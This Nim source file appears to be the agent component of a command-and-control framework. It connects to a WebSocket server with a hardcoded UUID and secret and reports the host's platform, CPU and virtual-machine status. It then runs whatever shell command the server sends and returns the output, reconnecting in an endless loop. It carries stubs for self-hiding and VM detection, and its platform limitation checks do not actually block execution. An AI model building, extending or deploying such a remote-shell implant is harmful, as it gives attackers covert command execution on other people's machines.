import std/json
import std/strutils
import osproc
import strformat
import asyncdispatch, ws

const HIDE_SELF = false

# TODO: Implement
if HIDE_SELF:
  discard

const UUID = "fe09423a-c414-4c09-b46c-2325296e692b"

const SECRET = "cxUjBjwDaBDiCQk3l9AW9BT4UE5ROK6fEpxL1qVQkxQ"

const WS_URL = fmt"ws://127.0.0.1:8000/agent/{UUID}/ws"

var PLATFORM: string

if hostOs == "linux":
  PLATFORM = "linux"
elif hostOs == "windows":
  PLATFORM = "win32"
elif hostOs == "macosx":
  PLATFORM = "darwin"

# TODO: Implement
var IS_VM: bool

proc main() {.async.} =
  var ws = await newWebSocket(WS_URL)

  # Send handshake and identify ourselves
  discard ws.send($(%*{"secret": SECRET, "platform": PLATFORM, "architecture": hostCPU, "vm": IS_VM}))

  let resp = parseJson(await ws.receiveStrPacket())

  echo $resp

  if resp{"status"}.getStr() != "200":
    raise newException(Exception, "Handshake failed")

  while true:
    var packet: JsonNode

    try:
      packet = parseJson(await ws.receiveStrPacket())
    except JsonParsingError:
      continue

    echo $packet

    # Limitations not tested

    let limitations = packet{"limitations"}.getElems()

    if limitations.len() > 0:
      for limitation in limitations:
        if limitation.getStr() == PLATFORM:
          await ws.send($(%*{"status": 403, "error": "Command not allowed on this platform"}))

        if limitation.getStr() == hostCPU:
          await ws.send($(%*{"status": 403, "error": "Command not allowed on this architecture"}))

        if limitation.getStr() == "no-vm" and IS_VM:
          await ws.send($(%*{"status": 403, "error": "Command not allowed in a virtual machine"}))

    if packet{"command"}.getStr() != "":
      var res = exec_cmd_ex(packet{"command"}.getStr())

      await ws.send($(%*{"status": 200, "output": res.output}))

  ws.close()

when isMainModule:
  while true:
    try:
      waitFor main()
    except Exception as e:
      echo e.msg
      waitFor sleepAsync(5000) 
